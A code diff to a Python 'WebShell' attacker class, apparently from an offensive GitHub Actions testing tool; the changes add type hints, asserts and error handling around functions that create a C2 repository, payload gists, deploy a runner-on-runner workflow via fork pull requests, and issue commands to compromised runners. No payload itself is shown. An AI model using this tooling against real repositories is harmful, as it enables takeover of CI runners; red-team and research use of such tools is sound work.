@@ -44,16 +44,18 @@ class WebShell(Attacker):
 
     def __init__(self, *args, **kwargs):
         super().__init__(*args, **kwargs)
-        self.payload_manager = None
-        self.c2_controller = None
-        self.repository_manager = None
+        self.payload_manager: PayloadManager | None = None
+        self.c2_controller: C2Controller | None = None
+        self.repository_manager: RepositoryManager | None = None
 
     def _initialize_components(self):
         """Initialize component managers."""
         if not self.payload_manager:
             self.payload_manager = PayloadManager(self.api, self)
         if not self.c2_controller:
-            self.c2_controller = C2Controller(self.api, self.user_perms, self.timeout)
+            self.c2_controller = C2Controller(
+                self.api, self.user_perms or {}, self.timeout
+            )
         if not self.repository_manager:
             self.repository_manager = RepositoryManager(self.api, self.timeout)
 
@@ -62,6 +64,7 @@ class WebShell(Attacker):
     ):
         """Delegates to PayloadManager."""
         self._initialize_components()
+        assert self.payload_manager is not None
         return await self.payload_manager.setup_payload_gist_and_workflow(
             c2_repo, target_os, target_arch, keep_alive
         )
@@ -72,7 +75,7 @@ class WebShell(Attacker):
         target_arch: str,
         requested_labels: list,
         keep_alive: bool = False,
-        c2_repo: str = None,
+        c2_repo: str | None = None,
         workflow_name: str = "Testing",
         run_name: str = "Testing",
     ):
@@ -80,9 +83,13 @@ class WebShell(Attacker):
         await self.setup_user_info()
 
         self._initialize_components()
+        assert self.payload_manager is not None
 
         if not c2_repo:
             c2_repo = await self.payload_manager.configure_c2_repository()
+            if not c2_repo:
+                Output.error("Failed to create C2 repository!")
+                return
             Output.info(f"Created C2 repository: {Output.bright(c2_repo)}")
         else:
             Output.info(f"Using provided C2 repository: {Output.bright(c2_repo)}")
@@ -116,7 +123,7 @@ class WebShell(Attacker):
         yaml_name: str = "tests",
         workflow_name: str = "Testing",
         run_name: str = "Testing",
-        c2_repo: str = None,
+        c2_repo: str | None = None,
     ):
         """Performs a runner-on-runner attack using the fork pull request technique.
 
@@ -124,6 +131,9 @@ class WebShell(Attacker):
         """
         await self.setup_user_info()
         self._initialize_components()
+        assert self.payload_manager is not None
+        assert self.c2_controller is not None
+        assert self.repository_manager is not None
 
         if not self.user_perms:
             return False
@@ -138,6 +148,8 @@ class WebShell(Attacker):
 
         if not c2_repo:
             c2_repo = await self.payload_manager.configure_c2_repository()
+            if not c2_repo:
+                return False
             Output.info(f"Created C2 repository: {Output.bright(c2_repo)}")
         else:
             Output.info(f"Using provided C2 repository: {Output.bright(c2_repo)}")
@@ -157,6 +169,10 @@ class WebShell(Attacker):
             c2_repo, target_os, target_arch, keep_alive=keep_alive
         )
 
+        if not gist_url:
+            Output.error("Failed to create Gist!")
+            return False
+
         ror_workflow = Payloads.create_ror_workflow(
             workflow_name, run_name, gist_url, requested_labels, target_os=target_os
         )
@@ -167,7 +183,7 @@ class WebShell(Attacker):
         )
 
         # Deploy workflow to the fork
-        if not await self.repository_manager.deploy_workflow(
+        if not await self.repository_manager.deploy_workflow(  # type: ignore[union-attr]
             repo_name,
             source_branch,
             ror_workflow.encode(),
@@ -230,15 +246,17 @@ class WebShell(Attacker):
         else:
             return False
 
-    async def interact_webshell(self, c2_repo: str, runner_name: str = None):
+    async def interact_webshell(self, c2_repo: str, runner_name: str | None = None):
         """Delegates to C2Controller."""
         await self.setup_user_info()
         self._initialize_components()
+        assert self.c2_controller is not None
         return await self.c2_controller.interact_webshell(c2_repo, runner_name)
 
     async def configure_c2_repository(self):
         """Delegates to PayloadManager."""
         self._initialize_components()
+        assert self.payload_manager is not None
         return await self.payload_manager.configure_c2_repository()
 
     async def format_ror_gist(
@@ -250,6 +268,7 @@ class WebShell(Attacker):
     ):
         """Delegates to PayloadManager."""
         self._initialize_components()
+        assert self.payload_manager is not None
         return await self.payload_manager.format_ror_gist(
             c2_repo, target_os, target_arch, keep_alive
         )
@@ -265,6 +284,7 @@ class WebShell(Attacker):
     ):
         """Delegates to C2Controller."""
         self._initialize_components()
+        assert self.c2_controller is not None
         return await self.c2_controller.issue_command(
             c2_repo, parameter, timeout, workflow_name, runner_name, download
         )
@@ -272,4 +292,5 @@ class WebShell(Attacker):
     async def list_runners(self, c2_repo):
         """Delegates to C2Controller."""
         self._initialize_components()
+        assert self.c2_controller is not None
         return await self.c2_controller.list_runners(c2_repo)
